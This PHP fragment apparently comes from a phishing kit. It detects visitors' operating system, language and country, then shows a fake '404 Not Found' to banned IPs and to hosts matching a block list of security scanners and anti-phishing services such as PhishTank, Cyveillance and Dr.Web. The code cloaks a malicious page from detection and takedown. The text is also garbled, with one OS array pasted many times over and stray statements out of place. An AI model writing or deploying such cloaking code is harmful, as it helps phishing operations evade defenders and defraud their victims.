                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );													
$m4_id=                                                 'XNi      L.T        I.y
                                                         QG,      9.1';													
													
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );
$os_array       =   array(
                                                        '/windows nt 10/i'     =>  'Windows 10',
                                                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                                                        '/windows nt 6.2/i'     =>  'Windows 8',
                                                        '/windows nt 6.1/i'     =>  'Windows 7',
                                                        '/windows nt 6.0/i'     =>  'Windows Vista',
                                                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                                        '/windows nt 5.1/i'     =>  'Windows XP',
                                                        '/windows xp/i'         =>  'Windows XP',
                                                        '/windows nt 5.0/i'     =>  'Windows 2000',
                                                        '/windows me/i'         =>  'Windows ME',
                                                        '/win98/i'              =>  'Windows 98',
                                                        '/win95/i'              =>  'Windows 95',
                                                        '/win16/i'              =>  'Windows 3.11',
                                                        '/macintosh|mac os x/i' =>  'Mac OS X',
                                                        '/mac_powerpc/i'        =>  'Mac OS 9',
                                                        '/linux/i'              =>  'Linux',
                                                        '/ubuntu/i'             =>  'Ubuntu',
                                                        '/iphone/i'             =>  'iPhone',
                                                        '/ipod/i'               =>  'iPod',
                                                        '/ipad/i'               =>  'iPad',
                                                        '/android/i'            =>  'Android',
                                                        '/blackberry/i'         =>  'BlackBerry',
                                                        
                                                    );



    foreach ($os_array as $regex => $value) 
        if (preg_match($regex, $user_agent)) 
            $os_platform    =   $value;
    return $os_platform;
    global $user_agent;
    $browser        =   "Unknown Browser";
$lang_var = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
switch ($lang_var){
    case "fr":
        $lang= "fr"; 
        break;
    case "it":
        $lang= "it";
        break;
    case "en":
        $lang= "en";
        break;        
    default:
        $lang= "en";
        break;
                    }
@$_SESSION['_lang_'] = $lang;                                  
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $countrycode = $ip_data->geoplugin_countryCode;
        @$_SESSION['cntcode'] = $countrycode;
    }
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {
        $countryname = $ip_data2->geoplugin_countryName;
        @$_SESSION['cntname'] = $countryname;
    }
if(in_array($IP_Connected,$IP_Banned)){
    $errors = '<h1>404 Not Found</h1>The page that you have requested could not be found.<br>';
   // $errors .= gethostbyaddr($_SERVER['REMOTE_ADDR']).'<br>';
  // $errors .= php_uname();
    die($errors);
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}
/* ==================== || CODED BY DWBM || ==================== */
?>